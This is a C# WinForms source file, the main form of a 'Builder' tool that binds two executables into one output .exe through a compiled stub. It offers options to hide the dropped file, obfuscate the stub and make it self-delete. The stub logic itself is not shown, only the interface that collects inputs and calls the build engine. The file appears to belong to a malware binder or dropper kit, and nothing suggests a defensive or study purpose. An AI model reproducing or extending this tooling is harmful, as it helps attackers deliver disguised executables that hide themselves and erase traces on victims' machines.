﻿using System.Diagnostics;
using System.Windows.Forms;
using Builder.ModulesBuilder;
namespace Builder
{
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void BuildBtn_Click(object sender, System.EventArgs e)
        {
            string
                DropPath = SelectedPath_Box.Text,
                File1 = File1Box.Text,
                File2 = File2Box.Text; 

            bool
                HideFile = HideFile_Box.Checked,
                Obfuscator = ObfuscatorChk.Checked,
                SelfDelete = SelfDelete_Chk.Checked;

            if (string.IsNullOrEmpty(File1) || string.IsNullOrEmpty(File2) || string.IsNullOrEmpty(DropPath))
            {
                MessageBox.Show("Please fill all fields!", "~ Build Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            using (SaveFileDialog save = new SaveFileDialog())
            {
                save.Title = "Save output file!";
                save.Filter = "EXE (*.exe)|*.exe";

                if (save.ShowDialog() == DialogResult.OK)
                {
                    BuildEngine.CompileStub(
                        save.FileName,
                        File1,
                        File2,
                        DropPath,
                        HideFile,
                        Obfuscator,
                        SelfDelete
                    );
                    MessageBox.Show("The compilation process has been completed!", "/ Build Information /", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        private void SelectFile1_Click(object sender, System.EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Select exe-file.";
                openFileDialog.Filter = "EXE (*.exe)|*.exe";

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    File1Box.Text = openFileDialog.FileName;
                    return;
                }
            }
        }
        private void SelectFile2_Click(object sender, System.EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Select exe-file.";
                openFileDialog.Filter = "EXE (*.exe)|*.exe";

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    File2Box.Text = openFileDialog.FileName;
                    return;
                }
            }
        }

        private void AuthorLabel_Click(object sender, System.EventArgs e)
        {
            Process.Start("https://github.com/k3rnel-dev");
        }

        private void GitLabel_Click(object sender, System.EventArgs e)
        {
            Process.Start("https://github.com/k3rnel-dev");
        }

        private void CreditsLabel_Click(object sender, System.EventArgs e)
        {
            Process.Start("https://github.com/0xd4d/dnlib");
            Process.Start("https://github.com/peters/winforms-modernui");
        }
    }
}
